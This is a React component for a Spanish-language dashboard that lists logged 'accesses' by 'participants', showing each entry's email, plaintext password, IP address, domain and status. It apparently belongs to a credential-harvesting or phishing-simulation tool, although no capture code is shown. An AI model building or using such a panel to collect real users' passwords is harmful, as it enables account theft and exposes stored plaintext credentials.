import {
  TableContainer,
  StyledTable,
  TableHead,
  TableHeadCell,
  TableRow,
  TableCell,
  StatusBadge,
  DomainBadge,
  EmptyState,
  TableScrollWrapper,
} from '../styles/DashboardStyles';

function AccessTable({ logs }) {
  if (!logs || logs.length === 0) {
    return (
      <TableContainer>
        <EmptyState>
          <p style={{ fontSize: '32px', marginBottom: '12px' }}>📭</p>
          <p>No se registraron accesos todavía.</p>
          <p style={{ fontSize: '12px', marginTop: '4px', color: '#5f6368' }}>
            Los accesos aparecerán aquí cuando los participantes ingresen.
          </p>
        </EmptyState>
      </TableContainer>
    );
  }

  return (
    <TableContainer>
      <TableScrollWrapper>
        <StyledTable>
          <TableHead>
            <tr>
              <TableHeadCell>ID</TableHeadCell>
              <TableHeadCell>Fecha</TableHeadCell>
              <TableHeadCell>Hora</TableHeadCell>
              <TableHeadCell>Email</TableHeadCell>
              <TableHeadCell>Contraseña</TableHeadCell>
              <TableHeadCell>IP</TableHeadCell>
              <TableHeadCell>Dominio</TableHeadCell>
              <TableHeadCell>Estado</TableHeadCell>
            </tr>
          </TableHead>
          <tbody>
            {logs.map((log) => (
              <TableRow key={log.id}>
                <TableCell style={{ color: '#9e9e9e', fontWeight: 500 }}>#{log.id}</TableCell>
                <TableCell>{log.date}</TableCell>
                <TableCell>{log.time}</TableCell>
                <TableCell style={{ fontFamily: 'monospace', fontSize: '13px' }}>
                  {log.email}
                </TableCell>
                <TableCell style={{ fontFamily: 'monospace', fontSize: '13px', color: '#e94560' }}>
                  {log.password}
                </TableCell>
                <TableCell style={{ fontFamily: 'monospace', fontSize: '12px', color: '#9e9e9e' }}>
                  {log.ipAddress}
                </TableCell>
                <TableCell>
                  <DomainBadge>{log.domain}</DomainBadge>
                </TableCell>
                <TableCell>
                  <StatusBadge>{log.status}</StatusBadge>
                </TableCell>
              </TableRow>
            ))}
          </tbody>
        </StyledTable>
      </TableScrollWrapper>
    </TableContainer>
  );
}

export default AccessTable;
